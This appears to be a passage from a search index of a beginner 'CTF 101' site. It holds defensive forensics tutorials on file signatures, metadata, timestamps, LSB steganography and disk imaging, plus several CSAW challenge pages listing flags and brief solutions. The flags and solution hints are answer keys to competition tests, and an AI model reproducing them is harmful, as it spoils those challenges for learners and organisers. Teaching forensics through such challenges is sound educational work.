{
    "docs": [
        {
            "location": "/", 
            "text": "Capture The Flag 101\n\n\nWelcome\n\n\nCapture The Flags, or CTFs, are a kind of computer security competition.\n\n\nTeams of competitors (or just individuals) are pitted against each other in a test of computer security skill.\n\n\nVery often CTFs are the beginning of one's cyber security career due to their team building nature and competetive aspect. In addition, there isn't a lot of commitment required beyond a weekend.\n\n\nIn this guide/wiki/handbook you'll learn the techniques, thought processes, and methodologies you need to succeed in Capture the Flag competitions.", 
            "title": "Index"
        }, 
        {
            "location": "/#capture-the-flag-101", 
            "text": "", 
            "title": "Capture The Flag 101"
        }, 
        {
            "location": "/#welcome", 
            "text": "Capture The Flags, or CTFs, are a kind of computer security competition.  Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill.  Very often CTFs are the beginning of one's cyber security career due to their team building nature and competetive aspect. In addition, there isn't a lot of commitment required beyond a weekend.  In this guide/wiki/handbook you'll learn the techniques, thought processes, and methodologies you need to succeed in Capture the Flag competitions.", 
            "title": "Welcome"
        }, 
        {
            "location": "/forensics/introduction/", 
            "text": "Forensics\n\n\nForensics is the art of recovering the digital trail left on a computer. There are plently of methods to find data which is seemingly deleted, not stored, or worse, covertly recorded. \n\n\nAn important part of Forensics is having the right tools, as well as being familair with the following topics:\n\n\n\n\nFile Formats\n\n\nEXIF data\n\n\nWireshark \n PCAPs\n\n\nWhat is Wireshark\n\n\nWhat are PCAPs\n\n\n\n\n\n\nStegonagraphy\n\n\nDisk Imaging", 
            "title": "Introduction"
        }, 
        {
            "location": "/forensics/introduction/#forensics", 
            "text": "Forensics is the art of recovering the digital trail left on a computer. There are plently of methods to find data which is seemingly deleted, not stored, or worse, covertly recorded.   An important part of Forensics is having the right tools, as well as being familair with the following topics:   File Formats  EXIF data  Wireshark   PCAPs  What is Wireshark  What are PCAPs    Stegonagraphy  Disk Imaging", 
            "title": "Forensics"
        }, 
        {
            "location": "/forensics/what-are-file-formats/", 
            "text": "File Formats\n\n\nFile Extensions are not the sole way to identify the type of a file, files have certain leading bytes called \nfile signatures\n which allow programs to parse the data in a consistent manner. Files can also contain additional \"hidden\" data called \nmetadata\n which can be useful in finding out information about the context of a file's data.\n\n\nFile Signatures\n\n\nFile signatures\n (also known as File Magic Numbers) are bytes within a file used to identify the format of the file. Generally they\u2019re 2-4 bytes long, found at the beginning of a file.\n\n\nWhat is it used for?\n\n\nFiles can sometimes come without an extension, or with incorrect ones. We use file signature analysis to identify the format (file type) of the file. Programs need to know the file type in order to open it properly.\n\n\nHow do you find the file signature?\n\n\nYou need to be able to look at the binary data that constitutes the file you\u2019re examining. To do this, you\u2019ll use a hexadecimal editor. Once you find the file signature, you can check it against file signature repositories \nsuch as Gary Kessler\u2019s\n.\n\n\nExample\n\n\nFile A\n\n\nThe file above, when opened in a Hex Editor, begins with the bytes \nFFD8FFE0 00104A46 494600\n or in ASCII \n\u02c7\u00ff\u02c7\u2021  JFIF\n where \n\\x00\n and \n\\x10\n lack symbols. \n\n\nSearching in \nGary Kessler\u2019s\n database shows that this file signature belongs to a \nJPEG/JFIF graphics file\n, exactly what we suspect.\n\n\nFile Metadata\n\n\nMetadata is data about data. Different types of files have different metadata. The metadata on a photo could include dates, camera information, GPS location, comments, etc. For music, it could include the title, author, track number and album.\n\n\nWhat kind of file metadata is useful?\n\n\nPotentially, any file metadata you can find could be useful.\n\n\nHow do I find it?\n\n\nOne of our favorite tools is exiftool, which displays metadata for an input file, including:\n- File size\n- Dimensions (width and height)\n- File type\n- Programs used to create (e.g. Photoshop)\n- OS used to create (e.g. Apple)\n\n\nRun command line: \nexiftool(-k).exe [filename]\n and you should see something like this:\n\n\n\n\nExample\n\n\nLet's take a look at File A's metadata with exiftool: \n\n\nFile type\n\n\nMetadata 1\n\n\nImage description\n\n\nMetadata 2\n\n\nMake and camera info\n\n\nMetadata 3\n\n\nGPS Latitude/Longitude\n\n\nMetadata 4\n\n\nTimestamps\n\n\nTimestamps are data that indicate the time of certain events (MAC):\n- Modification \u2013 when a file was modified\n- Access \u2013 when a file or entries were read or accessed\n- Creation \u2013 when files or entries were created\n\n\nTypes of timestamps\n\n\n\n\nModified\n\n\nAccessed\n\n\nCreated\n\n\nDate Changed (MFT)\n\n\nFilename Date Created (MFT)\n\n\nFilename Date Modified (MFT)\n\n\nFilename Date Accessed (MFT)\n\n\nINDX Entry Date Created\n\n\nINDX Entry Date Modified\n\n\nINDX Entry Date Accessed\n\n\nINDX Entry Date Changed\n\n\n\n\nWhy do we care?\n\n\nCertain events such as creating, moving, copying, opening, editing, etc. might affect the MAC times. If the MAC timestamps can be attained, a timeline of events could be created.\n\n\nTimeline Patterns\n\n\nThere are plenty more patterns than the ones introduced below, but these are the basics you should start with to get a good understanding of how it works, and to complete this challenge.\n\n\n\n\n\n\n\n\n\n\n\n\nExamples\n\n\nWe know that the BMP files fileA and fileD are the same, but that the JPEG files fileB and fileC are different somehow. So how can we find out what went on with these files?\n\n\n\n\nBy using time stamp information from the file system, we can learn that the BMP fileD was the original file, with fileA being a copy of the original. Afterward, fileB was created by modifying fileB, and fileC was created by modifying fileA in a different way.\n\n\nFollow along as we demonstrate.\n\n\nWe\u2019ll start by analyzing images in AccessData FTK Imager, where there\u2019s a Properties window that shows you some information about the file or folder you\u2019ve selected.\n\n\n\n\n\n\n\n\n\n\nHere are the extracted MAC times for fileA, fileB, fileC and fileD:\n\nNote, AccessData FTK Imager assumes that the file times on the drive are in UTC (Universal Coordinated Time). I subtracted four hours, since the USB was set up in Eastern Standard Time. This isn\u2019t necessary, but it helps me understand the times a bit better.\n\n\n\n\nHighlight timestamps that are the same, if timestamps are off by a few seconds, they should be counted as the same. This lets you see a clear difference between different timestamps. Then, highlight oldest to newest to help put them in order.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nIdentify timestamp patterns.", 
            "title": "What are File Formats"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#file-formats", 
            "text": "File Extensions are not the sole way to identify the type of a file, files have certain leading bytes called  file signatures  which allow programs to parse the data in a consistent manner. Files can also contain additional \"hidden\" data called  metadata  which can be useful in finding out information about the context of a file's data.", 
            "title": "File Formats"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#file-signatures", 
            "text": "File signatures  (also known as File Magic Numbers) are bytes within a file used to identify the format of the file. Generally they\u2019re 2-4 bytes long, found at the beginning of a file.", 
            "title": "File Signatures"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#what-is-it-used-for", 
            "text": "Files can sometimes come without an extension, or with incorrect ones. We use file signature analysis to identify the format (file type) of the file. Programs need to know the file type in order to open it properly.", 
            "title": "What is it used for?"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#how-do-you-find-the-file-signature", 
            "text": "You need to be able to look at the binary data that constitutes the file you\u2019re examining. To do this, you\u2019ll use a hexadecimal editor. Once you find the file signature, you can check it against file signature repositories  such as Gary Kessler\u2019s .", 
            "title": "How do you find the file signature?"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#example", 
            "text": "File A  The file above, when opened in a Hex Editor, begins with the bytes  FFD8FFE0 00104A46 494600  or in ASCII  \u02c7\u00ff\u02c7\u2021  JFIF  where  \\x00  and  \\x10  lack symbols.   Searching in  Gary Kessler\u2019s  database shows that this file signature belongs to a  JPEG/JFIF graphics file , exactly what we suspect.", 
            "title": "Example"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#file-metadata", 
            "text": "Metadata is data about data. Different types of files have different metadata. The metadata on a photo could include dates, camera information, GPS location, comments, etc. For music, it could include the title, author, track number and album.", 
            "title": "File Metadata"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#what-kind-of-file-metadata-is-useful", 
            "text": "Potentially, any file metadata you can find could be useful.", 
            "title": "What kind of file metadata is useful?"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#how-do-i-find-it", 
            "text": "One of our favorite tools is exiftool, which displays metadata for an input file, including:\n- File size\n- Dimensions (width and height)\n- File type\n- Programs used to create (e.g. Photoshop)\n- OS used to create (e.g. Apple)  Run command line:  exiftool(-k).exe [filename]  and you should see something like this:", 
            "title": "How do I find it?"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#example_1", 
            "text": "Let's take a look at File A's metadata with exiftool:   File type  Metadata 1  Image description  Metadata 2  Make and camera info  Metadata 3  GPS Latitude/Longitude  Metadata 4", 
            "title": "Example"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#timestamps", 
            "text": "Timestamps are data that indicate the time of certain events (MAC):\n- Modification \u2013 when a file was modified\n- Access \u2013 when a file or entries were read or accessed\n- Creation \u2013 when files or entries were created", 
            "title": "Timestamps"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#types-of-timestamps", 
            "text": "Modified  Accessed  Created  Date Changed (MFT)  Filename Date Created (MFT)  Filename Date Modified (MFT)  Filename Date Accessed (MFT)  INDX Entry Date Created  INDX Entry Date Modified  INDX Entry Date Accessed  INDX Entry Date Changed", 
            "title": "Types of timestamps"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#why-do-we-care", 
            "text": "Certain events such as creating, moving, copying, opening, editing, etc. might affect the MAC times. If the MAC timestamps can be attained, a timeline of events could be created.", 
            "title": "Why do we care?"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#timeline-patterns", 
            "text": "There are plenty more patterns than the ones introduced below, but these are the basics you should start with to get a good understanding of how it works, and to complete this challenge.", 
            "title": "Timeline Patterns"
        }, 
        {
            "location": "/forensics/what-are-file-formats/#examples", 
            "text": "We know that the BMP files fileA and fileD are the same, but that the JPEG files fileB and fileC are different somehow. So how can we find out what went on with these files?   By using time stamp information from the file system, we can learn that the BMP fileD was the original file, with fileA being a copy of the original. Afterward, fileB was created by modifying fileB, and fileC was created by modifying fileA in a different way.  Follow along as we demonstrate.  We\u2019ll start by analyzing images in AccessData FTK Imager, where there\u2019s a Properties window that shows you some information about the file or folder you\u2019ve selected.      Here are the extracted MAC times for fileA, fileB, fileC and fileD: Note, AccessData FTK Imager assumes that the file times on the drive are in UTC (Universal Coordinated Time). I subtracted four hours, since the USB was set up in Eastern Standard Time. This isn\u2019t necessary, but it helps me understand the times a bit better.   Highlight timestamps that are the same, if timestamps are off by a few seconds, they should be counted as the same. This lets you see a clear difference between different timestamps. Then, highlight oldest to newest to help put them in order.            Identify timestamp patterns.", 
            "title": "Examples"
        }, 
        {
            "location": "/forensics/what-is-exif-data/", 
            "text": "EXIF Data\n\n\nEXIF Data is metadata attached to photos which can include location, time, and device information.", 
            "title": "What is EXIF Data"
        }, 
        {
            "location": "/forensics/what-is-exif-data/#exif-data", 
            "text": "EXIF Data is metadata attached to photos which can include location, time, and device information.", 
            "title": "EXIF Data"
        }, 
        {
            "location": "/forensics/what-is-wireshark/", 
            "text": "Wireshark\n\n\nWireshark is a network protocol analyzer which is often used in CTF challenges to look at recorded network traffic.", 
            "title": "What is Wireshark"
        }, 
        {
            "location": "/forensics/what-is-wireshark/#wireshark", 
            "text": "Wireshark is a network protocol analyzer which is often used in CTF challenges to look at recorded network traffic.", 
            "title": "Wireshark"
        }, 
        {
            "location": "/forensics/what-are-pcaps/", 
            "text": "PCAPs\n\n\nPCAPs are often distributed in CTF challenges to provide recorded traffic history.", 
            "title": "What are PCAPs"
        }, 
        {
            "location": "/forensics/what-are-pcaps/#pcaps", 
            "text": "PCAPs are often distributed in CTF challenges to provide recorded traffic history.", 
            "title": "PCAPs"
        }, 
        {
            "location": "/forensics/what-is-stegonagraphy/", 
            "text": "Stegonagraphy\n\n\nStegonagraphy is the practice of hiding data in plain sight. Stegonagraphy is often embedded in images or audio.\n\n\nYou could send a picture of a cat to a friend and hide text inside. Looking at the image, there\u2019s nothing to make anyone think there\u2019s a message hidden inside it.\n\n\n\n\nYou could also hide a second image inside the first.\n\n\n\n\nStegonagraphy Detection\n\n\nSo we can hide text and an image, how do we find out if there is hidden data?\n\n\n\n\nFileA and FileD appear the same, but they\u2019re different. Also, FileD was modified after it was copied, so it\u2019s possible there might be steganography in it.\n\n\nFileB and FileC don\u2019t appear to have been modified after being created. That doesn\u2019t rule out the possibility that there\u2019s steganography in them, but you\u2019re more likely to find it in fileD. This brings up two questions:\n\n\n\n\nCan we determine that there is steganography in fileD?\n\n\nIf there is, what was hidden in it?\n\n\n\n\nLSB Stegonagraphy\n\n\nFile are made of bytes. Each byte is composed of eight bits.\n\n\n\n\nChanging the least-significant bit (LSB) doesn\u2019t change the value very much.\n\n\n\n\nSo we can modify the LSB without changing the file noticeably. By doing so, we can hide a message inside.\n\n\nLSB Stegonagraphy in Images\n\n\nLSB Stegonagraphy or \nLeast Significant Bit\n Stegonagraphy is a method of stegonagraphy where data is recorded in the lowest bit of a byte.\n\n\nSay an image has a pixel with an RGB value of (255, 255, 255), the bits of those RGB values will look like\n\n\n\n\n\n\n\n\n1\n\n\n1\n\n\n1\n\n\n1\n\n\n1\n\n\n1\n\n\n1\n\n\n1\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBy modifying the lowest, or least significant, bit, we can use the 1 bit space across every RGB value for every pixel to construct a message.\n\n\n\n\n\n\n\n\n1\n\n\n1\n\n\n1\n\n\n1\n\n\n1\n\n\n1\n\n\n1\n\n\n0\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThe reason stegonagraphy is hard to detect by sight is because a 1 bit difference in color is insignificant as seen below.\n\n\n\n\nExample\n\n\nLet\u2019s say we have an image, and part of it contains the following binary:\n\n\n\n\nAnd let\u2019s say we want to hide the character y inside.\n\n\nFirst, we need to convert the hidden message to binary.\n\n\n\n\nNow we take each bit from the hidden message and replace the LSB of the corresponding byte with it.\n\n\n\n\nAnd again:\n\n\n\n\nAnd again:\n\n\n\n\nAnd again:\n\n\n\n\nAnd again:\n\n\n\n\nAnd again:\n\n\n\n\nAnd again:\n\n\n\n\nAnd once more:\n\n\n\n\nDecoding LSB steganography is exactly the same as encoding, but in reverse. For each byte, grab the LSB and add it to your decoded message. Once you\u2019ve gone through each byte, convert all the LSBs you grabbed into text or a file. (You can use your file signature knowledge here!)\n\n\nWhat other types of steganography are there?\n\n\nSteganography is hard for the defense side, because there\u2019s practically an infinite number of ways it could be carried out. Here are a few examples:\n- LSB steganography: different bits, different bit combinations\n- Encode in every certain number of bytes \n- Use a password\n- Hide in different places\n- Use encryption on top of steganography", 
            "title": "What is Stegonagraphy"
        }, 
        {
            "location": "/forensics/what-is-stegonagraphy/#stegonagraphy", 
            "text": "Stegonagraphy is the practice of hiding data in plain sight. Stegonagraphy is often embedded in images or audio.  You could send a picture of a cat to a friend and hide text inside. Looking at the image, there\u2019s nothing to make anyone think there\u2019s a message hidden inside it.   You could also hide a second image inside the first.", 
            "title": "Stegonagraphy"
        }, 
        {
            "location": "/forensics/what-is-stegonagraphy/#stegonagraphy-detection", 
            "text": "So we can hide text and an image, how do we find out if there is hidden data?   FileA and FileD appear the same, but they\u2019re different. Also, FileD was modified after it was copied, so it\u2019s possible there might be steganography in it.  FileB and FileC don\u2019t appear to have been modified after being created. That doesn\u2019t rule out the possibility that there\u2019s steganography in them, but you\u2019re more likely to find it in fileD. This brings up two questions:   Can we determine that there is steganography in fileD?  If there is, what was hidden in it?", 
            "title": "Stegonagraphy Detection"
        }, 
        {
            "location": "/forensics/what-is-stegonagraphy/#lsb-stegonagraphy", 
            "text": "File are made of bytes. Each byte is composed of eight bits.   Changing the least-significant bit (LSB) doesn\u2019t change the value very much.   So we can modify the LSB without changing the file noticeably. By doing so, we can hide a message inside.", 
            "title": "LSB Stegonagraphy"
        }, 
        {
            "location": "/forensics/what-is-stegonagraphy/#lsb-stegonagraphy-in-images", 
            "text": "LSB Stegonagraphy or  Least Significant Bit  Stegonagraphy is a method of stegonagraphy where data is recorded in the lowest bit of a byte.  Say an image has a pixel with an RGB value of (255, 255, 255), the bits of those RGB values will look like     1  1  1  1  1  1  1  1                 By modifying the lowest, or least significant, bit, we can use the 1 bit space across every RGB value for every pixel to construct a message.     1  1  1  1  1  1  1  0                 The reason stegonagraphy is hard to detect by sight is because a 1 bit difference in color is insignificant as seen below.", 
            "title": "LSB Stegonagraphy in Images"
        }, 
        {
            "location": "/forensics/what-is-stegonagraphy/#example", 
            "text": "Let\u2019s say we have an image, and part of it contains the following binary:   And let\u2019s say we want to hide the character y inside.  First, we need to convert the hidden message to binary.   Now we take each bit from the hidden message and replace the LSB of the corresponding byte with it.   And again:   And again:   And again:   And again:   And again:   And again:   And once more:   Decoding LSB steganography is exactly the same as encoding, but in reverse. For each byte, grab the LSB and add it to your decoded message. Once you\u2019ve gone through each byte, convert all the LSBs you grabbed into text or a file. (You can use your file signature knowledge here!)", 
            "title": "Example"
        }, 
        {
            "location": "/forensics/what-is-stegonagraphy/#what-other-types-of-steganography-are-there", 
            "text": "Steganography is hard for the defense side, because there\u2019s practically an infinite number of ways it could be carried out. Here are a few examples:\n- LSB steganography: different bits, different bit combinations\n- Encode in every certain number of bytes \n- Use a password\n- Hide in different places\n- Use encryption on top of steganography", 
            "title": "What other types of steganography are there?"
        }, 
        {
            "location": "/forensics/what-is-disk-imaging/", 
            "text": "Disk Imaging\n\n\nA forensic image is an electronic copy of a drive (e.g. a hard drive, USB, etc.). It\u2019s a bit-by-\u00adbit or bitstream file that\u2019s an exact, unaltered copy of the media being duplicated.\n\n\nWikipedia said that the most straight\u00adforward disk imaging method is to read a disk from start to finish and write the data to a forensics image format. \u201cThis can be a time-consuming process, especially for disks with a large capacity,\u201d Wikipedia said.\n\n\nTo prevent write access to the disk, you can use a write blocker. It\u2019s also common to calculate a cryptographic hash of the entire disk when imaging it. \u201cCommonly-used cryptographic hashes are MD5, SHA1 and/or SHA256,\u201d said Wikipedia. \u201cBy recalculating the integrity hash at a later time, one can determine if the data in the disk image has been changed. This by itself provides no protection against intentional tampering, but it can indicate that the data was altered, e.g. due to corruption.\u201d\n\n\nWhy image a disk? Forensic imaging:\n- Prevents tampering with the original data\u00ad evidence\n- Allows you to play around with the copy, without worrying about messing up the original\n\n\nForensic Image Extraction Exmple\n\n\nThis example uses the tool \nAccessData FTK Imager\n.\n\n\nStep 1\n: Go to \nFile \n Create Disk Image\n\n\n\n\nStep 2\n: Select \nPhysical Drive\n, because the USB or hard drive you\u2019re imaging is a physical device or drive.\n\n\n\n\nStep 3\n: Select the drive you\u2019re imaging. The 1000 GB is my computer hard drive; the 128 MB is the USB that I want to image.\n\n\n\n\nStep 4\n: Add a new image destination\n\n\n\n\nStep 5\n: Select whichever image type you want. Choose \nRaw (dd)\n if you\u2019re a beginner, since it\u2019s the most common type\n\n\n\n\nStep 6\n: Fill in all the evidence information\n\n\n\n\nStep 7\n: Choose where you want to store it\n\n\n\n\nStep 8\n: The image destination has been added. Now you can start the image extraction\n\n\n\n\nStep 9\n: Wait for the image to be extracted\n\n\n\n\nStep 10\n: This is the completed extraction\n\n\n\n\nStep 11\n: Add the image you just created so that you can view it\n\n\n\n\nStep 12\n: This time, choose image file, since that\u2019s what you just created\n\n\n\n\nStep 13\n: Enter the path of the image you just created\n\n\n\n\nStep 14\n: View the image.\n\n\n\n\nEvidence tree\nStructure of the drive image\n\n\nFile list\nList of all the files in the drive image folder\n\n\nProperties\nProperties of the file/folder being examined\n\n\nHex viewer\nView of the drive/folders/files in hexadecimal\n\n\n\n\n\n\nStep 15\n: To view files in the USB, go to \nPartition\n \n1\n \n \n[\nUSB\n \nname\n]\n \n \n[\nroot\n]\n in the Evidence Tree and look in the File List\n\n\n\n\nStep 16\n: Selecting fileA, fileB, fileC, or fileD gives us some properties of the files \n a preview of each photo\n\n\n\n\nStep 17\n: Extract files of interest for further analysis by selecting, right-clicking and choosing \nExport Files", 
            "title": "What is Disk Imaging"
        }, 
        {
            "location": "/forensics/what-is-disk-imaging/#disk-imaging", 
            "text": "A forensic image is an electronic copy of a drive (e.g. a hard drive, USB, etc.). It\u2019s a bit-by-\u00adbit or bitstream file that\u2019s an exact, unaltered copy of the media being duplicated.  Wikipedia said that the most straight\u00adforward disk imaging method is to read a disk from start to finish and write the data to a forensics image format. \u201cThis can be a time-consuming process, especially for disks with a large capacity,\u201d Wikipedia said.  To prevent write access to the disk, you can use a write blocker. It\u2019s also common to calculate a cryptographic hash of the entire disk when imaging it. \u201cCommonly-used cryptographic hashes are MD5, SHA1 and/or SHA256,\u201d said Wikipedia. \u201cBy recalculating the integrity hash at a later time, one can determine if the data in the disk image has been changed. This by itself provides no protection against intentional tampering, but it can indicate that the data was altered, e.g. due to corruption.\u201d  Why image a disk? Forensic imaging:\n- Prevents tampering with the original data\u00ad evidence\n- Allows you to play around with the copy, without worrying about messing up the original", 
            "title": "Disk Imaging"
        }, 
        {
            "location": "/forensics/what-is-disk-imaging/#forensic-image-extraction-exmple", 
            "text": "This example uses the tool  AccessData FTK Imager .  Step 1 : Go to  File   Create Disk Image   Step 2 : Select  Physical Drive , because the USB or hard drive you\u2019re imaging is a physical device or drive.   Step 3 : Select the drive you\u2019re imaging. The 1000 GB is my computer hard drive; the 128 MB is the USB that I want to image.   Step 4 : Add a new image destination   Step 5 : Select whichever image type you want. Choose  Raw (dd)  if you\u2019re a beginner, since it\u2019s the most common type   Step 6 : Fill in all the evidence information   Step 7 : Choose where you want to store it   Step 8 : The image destination has been added. Now you can start the image extraction   Step 9 : Wait for the image to be extracted   Step 10 : This is the completed extraction   Step 11 : Add the image you just created so that you can view it   Step 12 : This time, choose image file, since that\u2019s what you just created   Step 13 : Enter the path of the image you just created   Step 14 : View the image.   Evidence tree\nStructure of the drive image  File list\nList of all the files in the drive image folder  Properties\nProperties of the file/folder being examined  Hex viewer\nView of the drive/folders/files in hexadecimal    Step 15 : To view files in the USB, go to  Partition   1     [ USB   name ]     [ root ]  in the Evidence Tree and look in the File List   Step 16 : Selecting fileA, fileB, fileC, or fileD gives us some properties of the files   a preview of each photo   Step 17 : Extract files of interest for further analysis by selecting, right-clicking and choosing  Export Files", 
            "title": "Forensic Image Extraction Exmple"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/", 
            "text": "Missed Registration\n\n\nAuthor\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nIt's registration day! These forms just seem longer and longer...\n\n\nFlag\n\n\nFLAG{3Am_LaunDR3Y_FL4G_L34kz!}\n\n\nSolution\n\n\nsolve.py\n\n\nFile for challenge\n\n\ncap.pcap", 
            "title": "Missed Registration"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#missed-registration", 
            "text": "", 
            "title": "Missed Registration"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#description", 
            "text": "It's registration day! These forms just seem longer and longer...", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#flag", 
            "text": "FLAG{3Am_LaunDR3Y_FL4G_L34kz!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/forensics/missed_registration/#file-for-challenge", 
            "text": "cap.pcap", 
            "title": "File for challenge"
        }, 
        {
            "location": "/challenges/2016/forensics/Clams_Dont_Dance/", 
            "text": "Clams Don't Dance\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nFind the clam and open it to find the pearl. \n\n\nFlag\n\n\nflag{TH1NK ABOUT 1T B1LL. 1F U D13D, WOULD ANY1 CARE??}\n\n\nSolution\n\n\nA deleted file can be recovered from the image, \nclam.pptx\n with Autopsy.\nUnzipping the clam, there is an \nimage0.gif\n inside of \nppt/media\n that is MaxiCode for the flag.\n\n\nSetup\n\n\nFiles: \nhttps://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Forensics/Clams_Dont_Dance", 
            "title": "Clams Don't Dance"
        }, 
        {
            "location": "/challenges/2016/forensics/Clams_Dont_Dance/#clams-dont-dance", 
            "text": "", 
            "title": "Clams Don't Dance"
        }, 
        {
            "location": "/challenges/2016/forensics/Clams_Dont_Dance/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/forensics/Clams_Dont_Dance/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/forensics/Clams_Dont_Dance/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/forensics/Clams_Dont_Dance/#description", 
            "text": "Find the clam and open it to find the pearl.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/forensics/Clams_Dont_Dance/#flag", 
            "text": "flag{TH1NK ABOUT 1T B1LL. 1F U D13D, WOULD ANY1 CARE??}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/forensics/Clams_Dont_Dance/#solution", 
            "text": "A deleted file can be recovered from the image,  clam.pptx  with Autopsy.\nUnzipping the clam, there is an  image0.gif  inside of  ppt/media  that is MaxiCode for the flag.", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/forensics/Clams_Dont_Dance/#setup", 
            "text": "Files:  https://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Forensics/Clams_Dont_Dance", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/forensics/Kill/", 
            "text": "Kill\n\n\nAuthor\n\n\nPoints\n\n\n50\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nIs kill can fix? Sign the autopsy file?\n\n\nFlag\n\n\nflag{roses_r_blue_violets_r_r3d_mayb3_harambae_is_not_kill}\n\n\nSolution\n\n\nkill.pcapng\n is kill. The file signature should be corrected to \n0A 0D 0D 0A\n... The third file's FTP-DATA starting at packet 696 contains the flag in a jpg file.", 
            "title": "Kill"
        }, 
        {
            "location": "/challenges/2016/forensics/Kill/#kill", 
            "text": "", 
            "title": "Kill"
        }, 
        {
            "location": "/challenges/2016/forensics/Kill/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/forensics/Kill/#points", 
            "text": "50", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/forensics/Kill/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/forensics/Kill/#description", 
            "text": "Is kill can fix? Sign the autopsy file?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/forensics/Kill/#flag", 
            "text": "flag{roses_r_blue_violets_r_r3d_mayb3_harambae_is_not_kill}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/forensics/Kill/#solution", 
            "text": "kill.pcapng  is kill. The file signature should be corrected to  0A 0D 0D 0A ... The third file's FTP-DATA starting at packet 696 contains the flag in a jpg file.", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/forensics/brainfun/", 
            "text": "Scrambled\n\n\nAuthor\n\n\nPoints\n\n\nn/a\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nScrambled Fun for Everyone! \n\n\nFlag\n\n\nflag{w3_r_th3_h0llow_m3n}\n\n\nSolution\n\n\nbf_solver.py", 
            "title": "Brainfun"
        }, 
        {
            "location": "/challenges/2016/forensics/brainfun/#scrambled", 
            "text": "", 
            "title": "Scrambled"
        }, 
        {
            "location": "/challenges/2016/forensics/brainfun/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/forensics/brainfun/#points", 
            "text": "n/a", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/forensics/brainfun/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/forensics/brainfun/#description", 
            "text": "Scrambled Fun for Everyone!", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/forensics/brainfun/#flag", 
            "text": "flag{w3_r_th3_h0llow_m3n}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/forensics/brainfun/#solution", 
            "text": "bf_solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/forensics/evidence.zip/", 
            "text": "Evidence.zip\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nI found this zip file that should have evidence about someone cheating. But for some reason, everything is broken!!\nCan you try to figure out what's up?\n\n\nFlag\n\n\nflag{th3_vi11i4n_w3_n33d_#freeleffen}\n\n\nSolution\n\n\nsoln.sh", 
            "title": "Evidence.zip"
        }, 
        {
            "location": "/challenges/2016/forensics/evidence.zip/#evidencezip", 
            "text": "", 
            "title": "Evidence.zip"
        }, 
        {
            "location": "/challenges/2016/forensics/evidence.zip/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/forensics/evidence.zip/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/forensics/evidence.zip/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/forensics/evidence.zip/#description", 
            "text": "I found this zip file that should have evidence about someone cheating. But for some reason, everything is broken!!\nCan you try to figure out what's up?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/forensics/evidence.zip/#flag", 
            "text": "flag{th3_vi11i4n_w3_n33d_#freeleffen}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/forensics/evidence.zip/#solution", 
            "text": "soln.sh", 
            "title": "Solution"
        }, 
        {
